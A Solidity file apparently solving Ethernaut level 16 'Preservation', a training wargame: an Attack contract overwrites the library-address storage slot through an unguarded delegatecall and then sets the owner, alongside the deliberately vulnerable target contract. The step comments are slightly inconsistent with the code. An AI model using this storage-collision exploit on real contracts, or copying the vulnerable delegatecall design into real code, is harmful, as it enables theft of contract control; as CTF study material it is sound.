// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Goal: claim ownership!
// Owner is set in the constructor below at deployment
// Create interfaces for the Ethernaut 16 contract deployed

// How?
// 1st call: If we call function setFirstTime ==> delegetecalls setTimeSignature ==> calls setTime and updates 1st storage variable (timeZone1Library)
// 2nd call: If we call function setFirstTime ==> delegetecalls setTimeSignature ==> calls setTime and updates 2nd storage variable (timeZone2Library)
// 3rd call: call setTime directly and it will update our 3rd storage variable which is owner


// How to run?
// Get CA from deployed Ethernaut 16 contract
// Deploy Attack contract
// Call function attack with CA as input
interface IPreservation {
    function owner() external view returns (address);
    function setFirstTime(uint256) external;
}

contract Attack {
    // Set the storage layout exactly the same as in de deployed Ethernaut 16 contract
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(IPreservation target) external {
        // set library to this contract
        target.setFirstTime(uint256(uint160(address(this)))); // This will update timeZone1Library
        // call setFirstTime to execute code inside this contract and update owner state variable
        // To pass this challenge, new owner must be the player (msg.sender)
        target.setFirstTime(uint256(uint160(msg.sender)));
        require(target.owner() == msg.sender, "hack failed");
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}


contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}